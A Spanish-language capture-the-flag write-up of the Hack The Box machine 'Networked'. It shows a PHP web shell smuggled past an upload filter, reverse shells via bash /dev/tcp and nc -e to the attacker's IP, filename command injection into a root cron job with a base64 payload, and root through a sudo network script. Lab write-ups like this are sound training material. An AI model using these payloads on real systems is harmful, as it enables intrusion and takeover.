10.10.10.146 - Networked

![Networked](https://user-images.githubusercontent.com/96772264/197965145-d3fd5d23-d00c-4a9d-b593-83cd42cf33b3.png)

------------------------

# Part 1: Enumeración

Tenemos los puertos 22(ssh) y 80(http)

```console
└─$ whatweb http://10.10.10.146
http://10.10.10.146 [200 OK] Apache[2.4.6], HTTPServer[CentOS][Apache/2.4.6 (CentOS) PHP/5.4.16],
```

El servidor nos dice que 

```
Hello mate, we're building the new FaceMash!
Help by funding us and be the new Tyler&Cameron!
Join us at the pool party this Sat to get a glimpse 
<!-- upload and gallery not yet linked -->
```
> Tyler&Cameron: modelo participante en el "Hombres Mujeres & Vicebersa" americano 
> FaceMash: red social ilegal para puntuar cual era la estudiante mas sexy de Harvard

```console
└─$ wfuzz -c --hc=404 -t 200  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.146/FUZZ/
000000021:   403        8 L      22 W       210 Ch      "cgi-bin"                                            
000000150:   200        1 L      1 W        2 Ch        "uploads"                                            
000000069:   200        1006 L   4983 W     74409 Ch    "icons"                                              
000001612:   200        15 L     55 W       885 Ch      "backup"
└─$ wfuzz -c --hc=404 -t 200  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.146/FUZZ.php
000000001:   200        8 L      40 W       229 Ch      "index"
000000165:   200        22 L     88 W       1302 Ch     "photos"
000000352:   200        5 L      13 W       169 Ch      "upload"
000000707:   200        0 L      0 W        0 Ch        "lib"
```
------------------------------

# Part 2: Web shell via File upload

/backup
Tenemos el archivo backup.tar donde sale el codigo de todos esos phps que hemos encontrado. Conclusiones:  
- Los archivos se suben a /uploads (/var/www/html/uploads/)  
- Metodo /POST parametros: myFile (archivo), submit.  
- Pone los permisos 644: (read write (propietario)   read(grupo)   read(otros))  
- El archivo a subir tiene que cumplir los requisitos de no ser muy grande y tener una extension de imagen.  
- Encima le cambia el nombre  

![networked2](https://user-images.githubusercontent.com/96772264/197965379-185ce95b-18e9-4910-8cac-8ddadac7133d.PNG)

Por tanto para burlar esto se le pone doble extension (para que verifique solo la segunda) y cabecera de GIF8 por los magic numbers:  
> **magic numbers**: primeros bits que determinan que clase de archivo tenemos  
```php
GIF8;
<?php echo "<pre>" . cmd_exec($_REQUEST['cmd']) . "</pre>";?>
```
```console
└─$ mv cmd.php cmd.php.jpg
└─$ curl -s -X POST http://10.10.10.146/upload.php -d 'myFile=@cmd.php.jpg&submit=go!'
```

Si nos vamos a /images.php y vemos de donde viene una imagen viene de ```/uploads/127_0_0_4.png``` es decir quita el nombre y lo cambia por una IP.  

![networked1](https://user-images.githubusercontent.com/96772264/197965421-e8b9ea78-7540-4942-b7cc-cf28a99183c4.PNG)

Si subimos una foto normal al servidor (la misma de centos) la ruta es ```/uploads/10_10_14_15.png``` Subimos la nuestra (cmd.php.jpg) por la web en vez de por
curl y ya funciona (se ve en la galeria) Copiando su ruta y haciendo una peticion tenemos que:  

```console
└─$ curl -s http://10.10.10.146/uploads/10_10_14_15.php.jpg?cmd=whoami                       
GIF8;
<pre>apache
</pre> 
└─$ curl -s "http://10.10.10.146/uploads/10_10_14_15.php.jpg?cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.14.15/443 0>%261'"
nada
└─$ curl -s "http://10.10.10.146/uploads/10_10_14_15.php.jpg?cmd=nc -e /bin/sh 10.10.14.15 443"
tampoco
```
Probe ambas en via web y la segunda me dio la shell.

----------------------------

# Part 3: Accediendo al usaurio basico

Tras un tratamiento de la tty subi mi script de enumeracion a /tmp:
```console
bash-4.2$ curl -O http://10.10.14.15:8000/lin_info_xii.sh
bash-4.2$ chmod +x ./lin_info_xii.sh
```

- Somos apache, los otros usaurios son root y guly  
- SUIDs -> pam_timestamp_check, unix_chkpwd, usernetctl, chage, pkexec, crontab, sudo  
- /var/mail/guly -> tendra algo?  
- Estan corriendo estos procesos: ```/usr/bin/python2 -Es /usr/sbin/tuned -l -P, /usr/sbin/rsyslogd -n```

Ninguno de los SUIDs nos sirven pero; 
```console
bash-4.2$ ls -l /home
total 4
drwxr-xr-x. 2 guly guly 4096 Sep  6 15:57 guly
```
En la carpeta del guly este tenemos que:
```console
bash-4.2$ ls -l
-r--r--r--. 1 root root  782 Oct 30  2018 check_attack.php
-rw-r--r--  1 root root   44 Oct 30  2018 crontab.guly
-r--------. 1 guly guly   33 Oct 25 11:01 user.txt
bash-4.2$ cat crontab.guly
*/3 * * * * php /home/guly/check_attack.php
```
Cada tres minutos se ejecuta eso por root, el problema esque no tenemos permiso se escritura, pero si de lectura.
```console
<?php 
require '/var/www/html/lib.php';  // Reutiliza código de la web.
$path = '/var/www/html/uploads/';
$logpath = '/tmp/attack.log';
$to = 'guly'; $msg= ''; $headers = "X-Mailer: check_attack.php\r\n";
$files = array(); $files = preg_grep('/^([^.])/', scandir($path)); // Por cada archivo de la ruta /uploads 
foreach ($files as $key => $value) { $msg='';    
  if ($value == 'index.html') { continue; }  
  list($name,$ext) = getnameCheck($value);
  $check = check_ip($name,$value);

  if (!($check[0])) {   // Si detecta que es malicioso (o sea no hay una ip bien puesta)
    echo "attack!\n";
    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);
    exec("rm -f $logpath"); 
    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &"); // ejecuta este comando
    echo "rm -f $path$value\n";
    mail($to, $msg, $msg, $headers, "-F$value"); }}?>
```
Como ejecuta el comando bin/rm -f $path$value y tenemos control de $value (o sea el nombre del archivo), podemos ponerle un nombre malicioso como: 
```test;whoami | nc 10.10.14.15 666``` haciendo que se concatenen dos comandos.  
```console
└─$ sudo nc -nlvp 666
Ncat: Connection from 10.10.10.146:36746.  
guly
```
La shell se cierra ```nc -e bash 10.10.14.15 666``` pero si se encodea eso en base64:
```; echo bmMgLWMgYmFzaCAxMC4xMC4xNC4xNSA2NjYK | base64 -d | bash```

----------------------------------

# Part 4: Obteniendo root

Ya estamriamos bajo el usaurio guly

-   (root) NOPASSWD: /usr/local/sbin/changename.sh

```console
[guly@networked tmp]$ sudo /usr/local/sbin/changename.sh
interface NAME:
test
interface PROXY_METHOD:
test
interface BROWSER_ONLY:
test
interface BOOTPROTO:
tesy
ERROR     : [/etc/sysconfig/network-scripts/ifup-eth] Device guly0 does not seem to be present, delaying initialization.
```
Si buscas en google ```network-scripts exploit``` sale [esto](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f).

```
[guly@networked tmp]$ sudo /usr/local/sbin/changename.sh
interface NAME:
asasda whoami
root 
root
[/etc/sysconfig/network-scripts/ifup-eth] Device guly0 does not seem to be present, delaying initialization.
[guly@networked ~]$ sudo /usr/local/sbin/changename.sh
interface NAME:
asdads bash
interface PROXY_METHOD:
sad
...
[root@networked network-scripts]# whoami
root
```
---------------------------------------

# Extra: Analizando el codigo

```php
$path = '/var/www/html/uploads/';   // A partir de esta ruta
$ignored = array('.', '..', 'index.html'); $files = array(); 
foreach (scandir($path) as $file) {
  if (in_array($file, $ignored)) continue;  //toma cada archivo salvo '.' '..' e 'index'
  $files[$file] = filemtime($path. '/' . $file); }
```
Repliqué el codigo y me salió:
```php
<?php
$path = '/home/cucuxii/Maquinas/htb/Networked';
$ignored = array('.', '..'); $files = array();
foreach (scandir($path) as $file) {  
    if (in_array($file, $ignored)) continue;
    $files[$file] = filemtime($path. '/' . $file);}
print_r($files);
?>
```
```console
└─$ php prueba.php 
Array
(
    [.Networked.md.swp] => 1666691784
    [.prueba.php.swp] => 1666692384
    [Networked.md] => 1666691390
    [backup] => 1666690965
    [prueba.php] => 1666692384
)
```
O sea que hace un diccionario por cada archivo y su calve valor es nombre:fecha.

